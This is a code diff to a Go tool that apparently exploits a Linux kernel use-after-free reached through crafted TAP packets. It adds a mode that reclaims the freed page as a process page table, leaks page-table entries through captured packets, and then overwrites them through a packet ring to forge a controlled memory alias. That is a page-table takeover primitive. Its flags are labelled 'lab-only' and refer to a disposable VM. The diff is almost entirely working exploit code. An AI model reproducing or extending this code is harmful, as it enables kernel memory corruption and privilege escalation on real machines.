@@ -19,17 +19,19 @@ import (
 )
 
 const (
-	iffTap        = 0x0002
-	iffNoPI       = 0x1000
-	iffVnetHdr    = 0x4000
-	tunSetIFF     = 0x400454ca
-	tunSetSndBuf  = 0x400454d4
-	needsCsum     = 1
-	mapPopulate   = 0x8000
-	ipProtoPCP    = 252
-	packetRXRing  = 5
-	packetVersion = 10
-	tpacketV2     = 1
+	iffTap         = 0x0002
+	iffNoPI        = 0x1000
+	iffVnetHdr     = 0x4000
+	tunSetIFF      = 0x400454ca
+	tunSetSndBuf   = 0x400454d4
+	needsCsum      = 1
+	mapPopulate    = 0x8000
+	mapNoReserve   = 0x4000
+	madvNoHugepage = 15
+	ipProtoPCP     = 252
+	packetRXRing   = 5
+	packetVersion  = 10
+	tpacketV2      = 1
 
 	ethLen     = 14
 	vlanLen    = 4
@@ -58,75 +60,79 @@ func main() {
 }
 
 type cfg struct {
-	head                int
-	rest                int
-	tebar               int
-	tebarFill           byte
-	capture             time.Duration
-	count               int
-	page                bool
-	skipVerify          bool
-	egress              bool
-	egressRest          int
-	iface               string
-	dst                 string
-	src                 string
-	gateway             string
-	dstMAC              string
-	egressWait          time.Duration
-	egressSpray         int
-	egressFill          byte
-	sprayDelay          time.Duration
-	vlanTags            int
-	answerDstARP        bool
-	transport           string
-	udpSrcPort          int
-	udpPort             int
-	tcpSrcPort          int
-	tcpPort             int
-	tcpValid            bool
-	tcpEcho             bool
-	staleOptions        bool
-	staleOptSkip        int
-	staleOptLen         int
-	staleGroom          bool
-	staleGrooms         int
-	staleDelay          time.Duration
-	staleEach           time.Duration
-	staleHold           bool
-	staleHead           uint64
-	staleFragPage       uint64
-	staleFragFile       string
-	staleFragSeeds      int
-	staleFragSeedLen    int
-	staleFragPadLen     int
-	staleFragGSOType    int
-	staleFragHdrLen     int
-	staleNaturalFrag    bool
-	staleNaturalOverlap bool
-	staleOverlapLocal   bool
-	staleLocalRollover  int
-	staleLocalSingleRef bool
-	staleSingleAnchors  int
-	staleSinglePCPPrime int
-	staleSinglePCPWait  time.Duration
-	staleSingleAnon     bool
-	staleSingleRing     bool
-	staleSingleRingSize int
-	staleNaturalAnon    bool
-	staleAnonSize       int
-	staleAnonJumbos     int
-	staleAnonWait       time.Duration
-	staleSKB            uint64
-	staleDev            uint64
-	staleHeadFile       string
-	staleCallback       uint64
-	staleCopyLen        int
-	staleExec           uint64
-	staleNoop           uint64
-	staleCommand        string
-	csumOffset          int
-	csumWord            uint
+	head                   int
+	rest                   int
+	tebar                  int
+	tebarFill              byte
+	capture                time.Duration
+	count                  int
+	page                   bool
+	skipVerify             bool
+	egress                 bool
+	egressRest             int
+	iface                  string
+	dst                    string
+	src                    string
+	gateway                string
+	dstMAC                 string
+	egressWait             time.Duration
+	egressSpray            int
+	egressFill             byte
+	sprayDelay             time.Duration
+	vlanTags               int
+	answerDstARP           bool
+	transport              string
+	udpSrcPort             int
+	udpPort                int
+	tcpSrcPort             int
+	tcpPort                int
+	tcpValid               bool
+	tcpEcho                bool
+	staleOptions           bool
+	staleOptSkip           int
+	staleOptLen            int
+	staleGroom             bool
+	staleGrooms            int
+	staleDelay             time.Duration
+	staleEach              time.Duration
+	staleHold              bool
+	staleHead              uint64
+	staleFragPage          uint64
+	staleFragFile          string
+	staleFragSeeds         int
+	staleFragSeedLen       int
+	staleFragPadLen        int
+	staleFragGSOType       int
+	staleFragHdrLen        int
+	staleNaturalFrag       bool
+	staleNaturalOverlap    bool
+	staleOverlapLocal      bool
+	staleLocalRollover     int
+	staleLocalSingleRef    bool
+	staleSingleAnchors     int
+	staleSinglePCPPrime    int
+	staleSinglePCPWait     time.Duration
+	staleSingleAnon        bool
+	staleSingleRing        bool
+	staleSingleRingSize    int
+	staleSinglePTE         bool
+	staleSinglePTECount    int
+	staleSinglePTETakeover bool
+	staleSingleHold        time.Duration
+	staleNaturalAnon       bool
+	staleAnonSize          int
+	staleAnonJumbos        int
+	staleAnonWait          time.Duration
+	staleSKB               uint64
+	staleDev               uint64
+	staleHeadFile          string
+	staleCallback          uint64
+	staleCopyLen           int
+	staleExec              uint64
+	staleNoop              uint64
+	staleCommand           string
+	csumOffset             int
+	csumWord               uint
 }
 
 func parseCfg() cfg {
@@ -185,6 +191,10 @@ func parseCfg() cfg {
 	flag.BoolVar(&c.staleSingleAnon, "stale-single-ref-anon", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 anonymous pages")
 	flag.BoolVar(&c.staleSingleRing, "stale-single-ref-packet-ring", false, "lab-only: after PCP priming, reclaim the cleanly freed order-3 target as order-0 PACKET_RX_RING pages")
 	flag.IntVar(&c.staleSingleRingSize, "stale-single-ref-ring-size", 64<<20, "lab-only: bytes in the order-0 PACKET_RX_RING reclaim spray")
+	flag.BoolVar(&c.staleSinglePTE, "stale-single-ref-pte", false, "lab-only: reclaim the cleanly freed order-3 target as a process PTE page")
+	flag.IntVar(&c.staleSinglePTECount, "stale-single-ref-pte-count", 8192, "lab-only: sparse 2 MiB regions faulted to allocate distinct PTE pages")
+	flag.BoolVar(&c.staleSinglePTETakeover, "stale-single-ref-pte-takeover", false, "lab-only: reclaim the prematurely freed live PTE page with controlled packet-ring entries")
+	staleSingleHoldMs := flag.Int("stale-single-ref-hold-ms", 0, "lab-only: keep the process alive after a PTE result so the disposable VM can be shut down before mm teardown")
 	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
 	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
 	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
@@ -209,6 +219,7 @@ func parseCfg() cfg {
 	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
 	c.staleAnonWait = time.Duration(*staleAnonWaitMs) * time.Millisecond
 	c.staleSinglePCPWait = time.Duration(*staleSinglePCPWaitMs) * time.Millisecond
+	c.staleSingleHold = time.Duration(*staleSingleHoldMs) * time.Millisecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.staleNaturalFrag {
 		applyStaleNaturalFrag(&c)
@@ -325,12 +336,32 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-packet-ring requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
 		os.Exit(1)
 	}
-	if c.staleSingleAnon && c.staleSingleRing {
-		fmt.Fprintln(os.Stderr, "-stale-single-ref-anon and -stale-single-ref-packet-ring are separate order-0 reclaim experiments")
+	if c.staleSinglePTE && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
+		os.Exit(1)
+	}
+	if (c.staleSingleAnon && c.staleSingleRing) || (c.staleSingleAnon && c.staleSinglePTE) || (c.staleSingleRing && c.staleSinglePTE) {
+		fmt.Fprintln(os.Stderr, "the single-reference anonymous, packet-ring, and PTE modes are separate order-0 reclaim experiments")
 		os.Exit(1)
 	}
 	if c.staleSingleRingSize < 8<<20 || c.staleSingleRingSize > 256<<20 || c.staleSingleRingSize%4096 != 0 {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-ring-size must be page-aligned and in 8 MiB..256 MiB")
+		os.Exit(1)
+	}
+	if c.staleSinglePTECount < 1024 || c.staleSinglePTECount > 16384 {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-count must be 1024..16384")
+		os.Exit(1)
+	}
+	if c.staleSinglePTETakeover && !c.staleSinglePTE {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-takeover requires -stale-single-ref-pte")
+		os.Exit(1)
+	}
+	if c.staleSingleHold < 0 || c.staleSingleHold > 5*time.Minute {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms must be 0..300000")
+		os.Exit(1)
+	}
+	if c.staleSingleHold != 0 && !c.staleSinglePTE {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms requires -stale-single-ref-pte")
 		os.Exit(1)
 	}
 	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
@@ -981,6 +1012,9 @@ func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) 
 	if c.staleSingleRing {
 		return reclaimSingleRefAsPacketRing(tap, cap, c, anchorID, localID, queued, pcpQueued)
 	}
+	if c.staleSinglePTE {
+		return reclaimSingleRefAsPTE(tap, cap, c, anchorID, localID, queued, pcpQueued)
+	}
 
 	reclaimID := localID + 1
 	for i := 0; i < c.staleSingleAnchors; i++ {
@@ -1144,29 +1178,38 @@ func packetRingRequest(size int) tpacketReq {
 	return tpacketReq{BlockSize: 4096, BlockNr: pages, FrameSize: 4096, FrameNr: pages}
 }
 
-func reclaimSingleRefAsPacketRing(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
-	queued, pcpQueued int) error {
+func allocatePacketRing(size int) (int, []byte, error) {
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
 	if err != nil {
-		return fmt.Errorf("stale-options: open PACKET_RX_RING reclaim socket: %w", err)
+		return -1, nil, err
+	}
+	if err := syscall.SetsockoptInt(fd, solPacket, packetVersion, tpacketV2); err != nil {
+		syscall.Close(fd)
+		return -1, nil, err
+	}
+	req := packetRingRequest(size)
+	if err := setPacketRXRing(fd, &req); err != nil {
+		syscall.Close(fd)
+		return -1, nil, err
+	}
+	ring, err := syscall.Mmap(fd, 0, size, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_SHARED)
+	if err != nil {
+		syscall.Close(fd)
+		return -1, nil, err
+	}
+	return fd, ring, nil
+}
+
+func reclaimSingleRefAsPacketRing(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
+	queued, pcpQueued int) error {
+	fd, ring, err := allocatePacketRing(c.staleSingleRingSize)
+	if err != nil {
+		return fmt.Errorf("stale-options: allocate PACKET_RX_RING reclaim: %w", err)
 	}
 	// Intentionally keep the socket and mapping alive through the stale read.
 	// Releasing either after a successful overlap would perform another put on
 	// a page whose refcount the stale descriptor has already changed.
-	if err := syscall.SetsockoptInt(fd, solPacket, packetVersion, tpacketV2); err != nil {
-		syscall.Close(fd)
-		return fmt.Errorf("stale-options: set PACKET_RX_RING version: %w", err)
-	}
 	pages := c.staleSingleRingSize / 4096
-	req := packetRingRequest(c.staleSingleRingSize)
-	if err := setPacketRXRing(fd, &req); err != nil {
-		syscall.Close(fd)
-		return fmt.Errorf("stale-options: allocate order-0 PACKET_RX_RING: %w", err)
-	}
-	ring, err := syscall.Mmap(fd, 0, c.staleSingleRingSize, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_SHARED)
-	if err != nil {
-		return fmt.Errorf("stale-options: map PACKET_RX_RING reclaim pages: %w", err)
-	}
 	const fill = byte(0xb6)
 	for i := range ring {
 		ring[i] = fill
@@ -1208,6 +1251,132 @@ func reclaimSingleRefAsPacketRing(tap *os.File, cap *capture, c cfg, anchorID, l
 	if staleAnchor < 0 {
 		return errors.New("stale-options: cleanly freed order-3 target was not observed in the order-0 PACKET_RX_RING")
 	}
+	return nil
+}
+
+const (
+	pmdSpan           = 2 << 20
+	pagemapPFNMask    = (uint64(1) << 55) - 1
+	x86PTEAddressMask = uint64(0x000ffffffffff000)
+)
+
+func sparsePTEFirstOffset(base uintptr) int {
+	return int((uintptr(pmdSpan) - base%uintptr(pmdSpan)) % uintptr(pmdSpan))
+}
+
+func sparsePTEMapping(count int) ([]byte, map[uint64]int, error) {
+	length := count*pmdSpan + pmdSpan
+	mapping, err := syscall.Mmap(-1, 0, length, syscall.PROT_READ|syscall.PROT_WRITE,
+		syscall.MAP_PRIVATE|syscall.MAP_ANON|mapNoReserve)
+	if err != nil {
+		return nil, nil, err
+	}
+	if err := syscall.Madvise(mapping, madvNoHugepage); err != nil {
+		return nil, nil, fmt.Errorf("MADV_NOHUGEPAGE: %w", err)
+	}
+	base := uintptr(unsafe.Pointer(&mapping[0]))
+	first := sparsePTEFirstOffset(base)
+	for i := 0; i < count; i++ {
+		mapping[first+i*pmdSpan] = byte(0xc7)
+	}
+
+	pagemap, err := os.Open("/proc/self/pagemap")
+	if err != nil {
+		return nil, nil, err
+	}
+	defer pagemap.Close()
+	expected := make(map[uint64]int, count)
+	var raw [8]byte
+	for i := 0; i < count; i++ {
+		virtual := uint64(base) + uint64(first+i*pmdSpan)
+		if _, err := pagemap.ReadAt(raw[:], int64((virtual/4096)*8)); err != nil {
+			return nil, nil, err
+		}
+		entry := binary.LittleEndian.Uint64(raw[:])
+		if entry&(uint64(1)<<63) == 0 {
+			return nil, nil, fmt.Errorf("sparse page %d is not present in pagemap", i)
+		}
+		pfn := entry & pagemapPFNMask
+		if pfn == 0 {
+			return nil, nil, errors.New("pagemap PFNs are hidden; PTE ownership cannot be verified")
+		}
+		expected[(pfn<<12)&x86PTEAddressMask] = i
+	}
+	return mapping, expected, nil
+}
+
+func reclaimSingleRefAsPTE(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
+	queued, pcpQueued int) error {
+	mapping, expected, err := sparsePTEMapping(c.staleSinglePTECount)
+	if err != nil {
+		return fmt.Errorf("stale-options: allocate sparse PTE reclaim mapping: %w", err)
+	}
+	staleAnchor := -1
+	matchedSparsePage := -1
+	matchedEntry := uint64(0)
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete PTE single-ref anchor %d head: %w", i, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete PTE single-ref anchor %d tail: %w", i, err)
+		}
+		pkts := cap.collect(c.capture, anchorID+uint16(i))
+		window, ok := ipv4PayloadWindow(pkts, 16, 32)
+		if !ok {
+			fmt.Printf("stale-options: pte anchor=%d window=missing\n", i)
+			continue
+		}
+		entry := binary.LittleEndian.Uint64(window[:8])
+		physical := entry & x86PTEAddressMask
+		sparsePage, matched := expected[physical]
+		fmt.Printf("stale-options: pte anchor=%d window=%s entry=%#x physical=%#x matched=%t\n",
+			i, hex.EncodeToString(window), entry, physical, matched)
+		if matched && entry&1 != 0 {
+			staleAnchor = i
+			matchedSparsePage = sparsePage
+			matchedEntry = entry
+			break
+		}
+	}
+	fmt.Printf("stale-options: single-ref-pte queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s pte_pages=%d virtual_bytes=%d anchors=%d local_id=%#x stale_anchor=%d sparse_page=%d pte=%#x matched=%t\n",
+		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait,
+		c.staleSinglePTECount, len(mapping), c.staleSingleAnchors, localID,
+		staleAnchor, matchedSparsePage, matchedEntry, staleAnchor >= 0)
+	if staleAnchor < 0 {
+		runtime.KeepAlive(mapping)
+		return errors.New("stale-options: cleanly freed order-3 target was not observed as a process PTE page")
+	}
+	if c.staleSinglePTETakeover {
+		fd, ring, err := allocatePacketRing(c.staleSingleRingSize)
+		if err != nil {
+			return fmt.Errorf("stale-options: allocate PTE-takeover packet ring: %w", err)
+		}
+		controlledPTE := matchedEntry
+		for offset := 0; offset < len(ring); offset += 8 {
+			binary.LittleEndian.PutUint64(ring[offset:offset+8], controlledPTE)
+		}
+		base := uintptr(unsafe.Pointer(&mapping[0]))
+		originalOffset := sparsePTEFirstOffset(base) + matchedSparsePage*pmdSpan
+		aliasOffset := originalOffset + 4096
+		aliasBefore := mapping[aliasOffset]
+		mapping[aliasOffset] = 0x4d
+		originalAfter := mapping[originalOffset]
+		matched := aliasBefore == 0xc7 && originalAfter == 0x4d
+		fmt.Printf("stale-options: pte-takeover ring_bytes=%d controlled_pte=%#x original_offset=%#x alias_offset=%#x alias_before=%#x original_after=%#x matched=%t\n",
+			len(ring), controlledPTE, originalOffset, aliasOffset, aliasBefore, originalAfter, matched)
+		runtime.KeepAlive(ring)
+		runtime.KeepAlive(fd)
+		if !matched {
+			return errors.New("stale-options: packet-ring reclaim did not create the controlled PTE alias")
+		}
+	}
+	if c.staleSingleHold != 0 {
+		fmt.Printf("stale-options: holding live PTE state for %s; shut down the disposable VM before teardown\n", c.staleSingleHold)
+		time.Sleep(c.staleSingleHold)
+	}
+	runtime.KeepAlive(mapping)
 	return nil
 }
 
